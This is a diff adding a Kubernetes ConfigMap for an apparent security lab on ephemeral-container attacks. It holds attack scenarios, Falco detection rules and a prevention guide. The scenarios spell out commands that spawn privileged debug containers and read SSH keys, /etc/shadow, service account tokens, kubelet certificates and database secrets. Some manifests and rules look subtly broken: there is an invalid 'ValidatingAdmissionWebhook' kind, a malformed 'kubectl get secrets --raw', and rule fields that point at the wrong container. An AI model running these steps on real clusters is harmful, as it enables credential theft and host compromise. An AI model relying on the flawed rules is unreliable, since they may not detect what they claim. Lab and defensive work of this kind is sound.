@@ -1,0 +1,406 @@
+# Attack scenarios and detection rules for ephemeral container attacks
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: ephemeral-attack-scenarios
+  namespace: ephemeral-lab
+data:
+  attack-scenarios.md: |
+    # Ephemeral Container Attack Scenarios
+    
+    ## Scenario 1: Privilege Escalation via Ephemeral Containers
+    
+    ### Attack Steps:
+    1. **Reconnaissance**: Identify pods with sensitive data or privileged access
+    2. **RBAC Exploitation**: Use overly permissive RBAC to create ephemeral containers
+    3. **Container Escape**: Spawn privileged ephemeral containers in target pods
+    4. **Data Exfiltration**: Access host filesystem, secrets, and sensitive data
+    5. **Persistence**: Establish persistent access through compromised containers
+    
+    ### Commands to Execute:
+    ```bash
+    # 1. List pods and identify targets
+    kubectl get pods -n ephemeral-lab -o wide
+    
+    # 2. Check RBAC permissions
+    kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
+    
+    # 3. Create privileged ephemeral container
+    kubectl debug web-app -n ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
+    
+    # 4. Access the ephemeral container
+    kubectl exec -it web-app -n ephemeral-lab -c debug -- /bin/sh
+    
+    # 5. Explore the host filesystem
+    ls -la /host/root/
+    cat /host/root/.ssh/id_rsa
+    
+    # 6. Access secrets
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token
+    kubectl get secrets -n ephemeral-lab --raw
+    ```
+    
+    ## Scenario 2: Data Exfiltration from Database Pod
+    
+    ### Attack Steps:
+    1. **Target Identification**: Focus on database pod with sensitive data
+    2. **Ephemeral Container**: Create debugging container in database pod
+    3. **Data Access**: Access database files and credentials
+    4. **Network Reconnaissance**: Scan for additional targets
+    5. **Lateral Movement**: Use credentials to access other services
+    
+    ### Commands to Execute:
+    ```bash
+    # 1. Create ephemeral container in database pod
+    kubectl debug database -n ephemeral-lab --image=postgres:13 --target=postgres -- sleep 3600
+    
+    # 2. Access the ephemeral container
+    kubectl exec -it database -n ephemeral-lab -c debug -- /bin/bash
+    
+    # 3. Access database files
+    ls -la /var/lib/postgresql/data/
+    cat /var/lib/postgresql/data/postgresql.conf
+    
+    # 4. Connect to database
+    psql -U admin -d sensitive_data -c "SELECT * FROM users;"
+    
+    # 5. Access secrets
+    cat /etc/postgresql/secrets/password
+    cat /etc/postgresql/secrets/connection-string
+    ```
+    
+    ## Scenario 3: Host Access via Privileged Pod
+    
+    ### Attack Steps:
+    1. **Target Selection**: Focus on monitoring pod with privileged access
+    2. **Ephemeral Container**: Create debugging container with host access
+    3. **Host Exploration**: Access host filesystem and processes
+    4. **Credential Harvesting**: Extract host credentials and certificates
+    5. **Persistence**: Establish persistent access to host
+    
+    ### Commands to Execute:
+    ```bash
+    # 1. Create privileged ephemeral container
+    kubectl debug monitoring -n ephemeral-lab --image=alpine --target=monitoring-agent --privileged -- sleep 3600
+    
+    # 2. Access the ephemeral container
+    kubectl exec -it monitoring -n ephemeral-lab -c debug -- /bin/sh
+    
+    # 3. Explore host filesystem
+    ls -la /host/root/
+    ls -la /host/etc/
+    cat /host/etc/shadow
+    
+    # 4. Access host processes
+    ps aux
+    netstat -tulpn
+    
+    # 5. Access Kubernetes secrets
+    cat /host/var/lib/kubelet/pki/kubelet-client-current.pem
+    cat /host/etc/kubernetes/pki/ca.crt
+    ```
+    
+    ## Detection and Prevention
+    
+    ### Detection Rules:
+    ```yaml
+    # Falco rules for ephemeral container detection
+    - rule: Ephemeral Container Created
+      desc: Detect creation of ephemeral containers
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers
+      output: >
+        Ephemeral container created (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace)
+      priority: WARNING
+    
+    - rule: Privileged Ephemeral Container
+      desc: Detect privileged ephemeral containers
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.containers[0].securityContext.privileged=true
+      output: >
+        Privileged ephemeral container created (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace)
+      priority: CRITICAL
+    ```
+    
+    ### Prevention Measures:
+    1. **RBAC Restrictions**: Limit ephemeral container permissions
+    2. **Pod Security Standards**: Use Pod Security Standards
+    3. **Network Policies**: Restrict network access
+    4. **Monitoring**: Implement comprehensive monitoring
+    5. **Regular Audits**: Regular security assessments
+    
+    ## Mitigation Steps:
+    
+    ### Immediate Response:
+    1. **Revoke Access**: Remove overly permissive RBAC
+    2. **Kill Containers**: Terminate suspicious ephemeral containers
+    3. **Rotate Secrets**: Rotate all potentially compromised secrets
+    4. **Audit Logs**: Review audit logs for suspicious activity
+    
+    ### Long-term Prevention:
+    1. **Implement Pod Security Standards**
+    2. **Use Network Policies**
+    3. **Implement Admission Controllers**
+    4. **Regular Security Training**
+    5. **Continuous Monitoring**
+  
+  detection-rules.yaml: |
+    # Falco detection rules for ephemeral container attacks
+    - rule: Ephemeral Container Creation
+      desc: Detect creation of ephemeral containers
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers
+      output: >
+        Ephemeral container created (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace
+        image=%ka.req.pod.spec.containers[0].image)
+      priority: WARNING
+      tags: [ephemeral, container, security]
+    
+    - rule: Privileged Ephemeral Container
+      desc: Detect privileged ephemeral containers
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.containers[0].securityContext.privileged=true
+      output: >
+        CRITICAL: Privileged ephemeral container created (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace
+        image=%ka.req.pod.spec.containers[0].image)
+      priority: CRITICAL
+      tags: [ephemeral, container, privileged, security]
+    
+    - rule: Ephemeral Container with Host Access
+      desc: Detect ephemeral containers with host access
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.hostNetwork=true
+      output: >
+        CRITICAL: Ephemeral container with host network access (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace)
+      priority: CRITICAL
+      tags: [ephemeral, container, host, security]
+    
+    - rule: Ephemeral Container with Host PID
+      desc: Detect ephemeral containers with host PID namespace
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.hostPID=true
+      output: >
+        CRITICAL: Ephemeral container with host PID access (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace)
+      priority: CRITICAL
+      tags: [ephemeral, container, host, security]
+    
+    - rule: Ephemeral Container with Host IPC
+      desc: Detect ephemeral containers with host IPC namespace
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.hostIPC=true
+      output: >
+        CRITICAL: Ephemeral container with host IPC access (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace)
+      priority: CRITICAL
+      tags: [ephemeral, container, host, security]
+    
+    - rule: Ephemeral Container with Host Path Volume
+      desc: Detect ephemeral containers with host path volumes
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.volumes[0].hostPath
+      output: >
+        WARNING: Ephemeral container with host path volume (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace
+        path=%ka.req.pod.spec.volumes[0].hostPath.path)
+      priority: WARNING
+      tags: [ephemeral, container, host, security]
+    
+    - rule: Ephemeral Container with Capabilities
+      desc: Detect ephemeral containers with dangerous capabilities
+      condition: >
+        ka.verb=create and
+        ka.target.resource=pods/ephemeralcontainers and
+        ka.req.pod.spec.containers[0].securityContext.capabilities.add
+      output: >
+        WARNING: Ephemeral container with capabilities (user=%ka.user.name
+        pod=%ka.target.name namespace=%ka.target.namespace
+        capabilities=%ka.req.pod.spec.containers[0].securityContext.capabilities.add)
+      priority: WARNING
+      tags: [ephemeral, container, capabilities, security]
+  
+  prevention-guide.md: |
+    # Ephemeral Container Attack Prevention Guide
+    
+    ## 1. RBAC Best Practices
+    
+    ### Principle of Least Privilege:
+    ```yaml
+    # GOOD: Minimal permissions for ephemeral containers
+    apiVersion: rbac.authorization.k8s.io/v1
+    kind: Role
+    metadata:
+      name: minimal-debug-role
+    rules:
+    - apiGroups: [""]
+      resources: ["pods"]
+      verbs: ["get", "list"]
+      resourceNames: ["specific-pod-name"]  # Restrict to specific pods
+    - apiGroups: [""]
+      resources: ["pods/ephemeralcontainers"]
+      verbs: ["get", "list", "create"]
+      resourceNames: ["specific-pod-name"]  # Restrict to specific pods
+    ```
+    
+    ### Avoid Cluster-wide Permissions:
+    ```yaml
+    # BAD: Cluster-wide permissions
+    apiVersion: rbac.authorization.k8s.io/v1
+    kind: ClusterRole
+    metadata:
+      name: debug-cluster-role
+    rules:
+    - apiGroups: [""]
+      resources: ["pods"]
+      verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
+    - apiGroups: [""]
+      resources: ["pods/ephemeralcontainers"]
+      verbs: ["get", "list", "watch", "create", "update", "patch"]
+    ```
+    
+    ## 2. Pod Security Standards
+    
+    ### Use Pod Security Standards:
+    ```yaml
+    apiVersion: v1
+    kind: Namespace
+    metadata:
+      name: secure-namespace
+      labels:
+        pod-security.kubernetes.io/enforce: restricted
+        pod-security.kubernetes.io/audit: restricted
+        pod-security.kubernetes.io/warn: restricted
+    ```
+    
+    ### Security Context Best Practices:
+    ```yaml
+    securityContext:
+      runAsUser: 1000
+      runAsGroup: 1000
+      runAsNonRoot: true
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true
+      capabilities:
+        drop:
+        - ALL
+        add:
+        - NET_BIND_SERVICE  # Only if necessary
+    ```
+    
+    ## 3. Network Policies
+    
+    ### Restrict Network Access:
+    ```yaml
+    apiVersion: networking.k8s.io/v1
+    kind: NetworkPolicy
+    metadata:
+      name: restrict-ephemeral-access
+    spec:
+      podSelector:
+        matchLabels:
+          app: web-app
+      policyTypes:
+      - Ingress
+      - Egress
+      ingress:
+      - from:
+        - namespaceSelector:
+            matchLabels:
+              name: secure-namespace
+        ports:
+        - protocol: TCP
+          port: 80
+      egress:
+      - to:
+        - namespaceSelector:
+            matchLabels:
+              name: secure-namespace
+        ports:
+        - protocol: TCP
+          port: 5432
+    ```
+    
+    ## 4. Admission Controllers
+    
+    ### Use Validating Admission Webhooks:
+    ```yaml
+    apiVersion: admissionregistration.k8s.io/v1
+    kind: ValidatingAdmissionWebhook
+    metadata:
+      name: ephemeral-container-validator
+    webhooks:
+    - name: ephemeral-container-validator.example.com
+      clientConfig:
+        service:
+          name: ephemeral-validator
+          namespace: kube-system
+          path: "/validate"
+      rules:
+      - operations: ["CREATE"]
+        apiGroups: [""]
+        apiVersions: ["v1"]
+        resources: ["pods/ephemeralcontainers"]
+      failurePolicy: Fail
+    ```
+    
+    ## 5. Monitoring and Detection
+    
+    ### Implement Comprehensive Monitoring:
+    - **Audit Logging**: Enable audit logging for all API calls
+    - **Falco Rules**: Use Falco for runtime security monitoring
+    - **Prometheus Metrics**: Monitor container creation and execution
+    - **Log Aggregation**: Centralize logs for analysis
+    
+    ### Key Metrics to Monitor:
+    - Ephemeral container creation frequency
+    - Privileged container usage
+    - Host access attempts
+    - Unusual network patterns
+    - Resource usage anomalies
+    
+    ## 6. Regular Security Assessments
+    
+    ### Security Checklist:
+    - [ ] RBAC permissions reviewed and minimized
+    - [ ] Pod Security Standards implemented
+    - [ ] Network policies configured
+    - [ ] Admission controllers enabled
+    - [ ] Monitoring and detection in place
+    - [ ] Regular security training conducted
+    - [ ] Incident response procedures documented
+    - [ ] Regular penetration testing performed
+    
+    ## 7. Incident Response
+    
+    ### Immediate Response:
+    1. **Identify**: Detect the attack through monitoring
+    2. **Contain**: Isolate affected pods and namespaces
+    3. **Eradicate**: Remove malicious ephemeral containers
+    4. **Recover**: Restore services with secure configurations
+    5. **Lessons Learned**: Update security measures
+    
+    ### Long-term Response:
+    1. **Root Cause Analysis**: Understand how the attack occurred
+    2. **Security Improvements**: Implement additional controls
+    3. **Training**: Educate team on new threats
+    4. **Testing**: Regular security assessments
+    5. **Documentation**: Update security procedures
